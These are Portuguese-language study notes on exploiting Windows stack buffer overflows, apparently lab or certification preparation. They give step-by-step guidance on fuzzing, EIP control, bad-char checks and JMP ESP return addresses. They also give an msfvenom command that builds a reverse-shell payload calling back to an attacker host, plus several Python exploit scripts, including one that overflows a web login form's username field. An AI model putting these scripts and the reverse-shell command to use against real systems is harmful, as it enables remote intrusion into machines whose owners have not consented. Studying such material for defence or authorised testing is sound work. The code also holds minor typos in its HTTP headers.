
# Conceito
O buffer overflow acontece quando é inserido uma quantidade grande de dados, que sobrescrevem o buffer, o EBP (base da Stack), o endereço de retorno, e o EIP, que indica o endereço da próxima instrução. Então pode-se tentar ganhar o controle do EIP, testar bad chars para assim encontrar um bom endereço de retorno, gerar um shellcode e ganhar acesso remoto através da shell

# Passos
## Coleta de Informações
- Identificar o software
- Entender como funciona a comunicação

## Fuzzing
- Enviar diversos tipos de dados afim de testar o comportamento do software

## Identificar a vulnerabilidade
- Atingir o EIP enviando dados até o programa sofrer de buffer overflow
- Controlar o EIP

## Identificar BadChars
- Identificar caracteres inválidos para não enviar na hora de enviar a shell

## Identificar Endereço de Retorno
- Identificar um ótimo local para o EIP enviar o shellcode
- Achar algum endereço que tenha um JMP ESP, visto que é um endereço fixo
- Procurar nas DLLs um comando JPM ESP

## Gerar o shellcode
- Fazer o exploit final e enviar para a aplicação para testar se funciona
- msfvenom -p windows/shell_reverse_tcp lhost=172.16.1.2 lport=443 exitfunc=thread -b "badchars" -f c

---
# Exemplos

## Fuzzing de dados

```python
#!/usr/bin/python
import socket

dados = "A" * 2007 + "BBBB" + "C" * 500 # Testar quantos dados precisam

lista = ["A"]
contador = 100

while len(lista) <= 3: # Calcula de 100 em 100
	lista.append("A" * contador) 
	contador = contador + 100 

for dados in lista:
	print "Fuzzing com SEND %s bytes" %len(dados)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.5",5800))
banner = s.recv(1024)
print banner
s.send("SEND " + dados + "\r\n")
```
---
## Lista de caracteres para BadChars

```python
#!/usr/bin/python

for num in range(0,256):
	print ((hex(num).replace('0x','\\x')),

```
---
## Verificação de BadChars

```python
#!/usr/bin/python
import socket

bad = "all bad chars" #Quando um char não é permitido, ele não aparece na pilha

dados = "A" * 2007 + "BBBB" + bad # Utilizar quando já tiver o número de dados

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.5",5800))
banner = s.recv(1024)
print banner
s.send("SEND " + dados + "\r\n")
```
---
## Fluxo de execução

```python
#!/usr/bin/python
import socket

#0x625012a0 - Endereço fictício

dados = "A" * 2007 + "\xa0\x12\x50\x62" + "\x90" * 32 + "C" * (500 - 32)
#'A's até EIP + Endereço JPM ESP + NOP + Shell

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.5",5800))
s.send("SEND " + dados + "\r\n")
```
---
## Exploit Final
```python
#!/usr/bin/python
import socket

shellcode = ("shellcode")

#0x625012a0 - Endereço fictício

exploit = "A" * 2007 + "\xa0\x12\x50\x62" + "\x90" * 32 + shellcode
#'A's até EIP + Endereço JPM ESP + NOP + Shell

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.5",5800))
s.send("SEND " + exploit + "\r\n")
```
---
## Exploit Web

```python
#!/usr/bin/python
import socket

# badchars = \x00\x0a\x0d\x25\x26\x2b\x3d
badchar = ("badchars")

# endereço de retorno = 0x10090c83

shellcode = ("shellcode")

dados = "A" * 780 + "\x83\x0c\x09\x10" + "\x90" * 16 + shellcode
tam = len(dados) + 20

request="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.0.5\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0 Firefox/68.0\r\n)"
request+="Accept: text/html, application/xhtml+xml,application/xml;q=0.9\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n"
request+="Accept-Encoding: gzip, deflatre\r\n"
request+="Referer: http://192.168.0.5/login\r\n"
request+="Content-Type: applcation/x-www-form-urlencoded\r\n"
request+="Content-Lenght: " + str(tam) + "\r\n"
request+="DNT: 1\r\n"
request+="Connection: close\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
request+="username=" + dados + "&password=A"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.5",80))
s.send(request)
```

# DEP - Data Execution Prevention
Também conhecido como non-execute (NX), tem como objetivo prevenir a execução de de códigos em memória

# ASLR - Address Space Layout Randomization
A ideia por trás do ASLR é tornar os endereços de memória aleatórios dificultando que o atacante consiga um endereço fixo durante a exploração